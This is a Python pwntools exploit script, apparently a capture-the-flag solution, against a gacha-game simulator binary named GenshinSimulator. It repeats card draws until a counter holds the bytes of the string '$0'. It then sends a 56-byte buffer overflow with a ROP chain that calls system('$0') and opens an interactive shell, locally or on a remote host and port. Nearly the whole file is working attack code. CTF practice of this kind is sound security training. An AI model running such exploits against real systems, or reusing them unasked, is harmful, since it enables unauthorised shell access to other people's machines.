#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './GenshinSimulator'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

# context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag              :p.info(tag + ': {:#x}'.format(eval(tag)))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400d13 # pop rdi ; ret

target = 0x3024 # $0

cnt = 0
while 1:
    if target-cnt>9:
        sla('[1]单抽 [2]十连 [3]结束抽卡\n','2')
    else:
        sla('[1]单抽 [2]十连 [3]结束抽卡\n','1')
    ru('抽卡结果如下：\n')
    data = ru('请选择')
    for i in data.split('\n'):
        if i[:10] == '\xe2\x98\x85\xe2\x98\x85\xe2\x98\x85 ':
            cnt += 1
    print target - cnt
    if target - cnt == 0:
        break
    if target - cnt < 0:
        print 'try again'
        exit()
print 'done'
print cnt

sla('[1]单抽 [2]十连 [3]结束抽卡\n','3')
sla('请选择：[1]向好友炫耀 [2]退出\n','1')
ru('请输入你的名字：\n')
context.log_level = 'debug'

offset = 56
payload = 'A'*offset
payload += p64(prdi+1)
payload += p64(prdi) + p64(0x602314)
payload += p64(elf.sym['system'])

# debug()
sl(payload)

p.interactive()
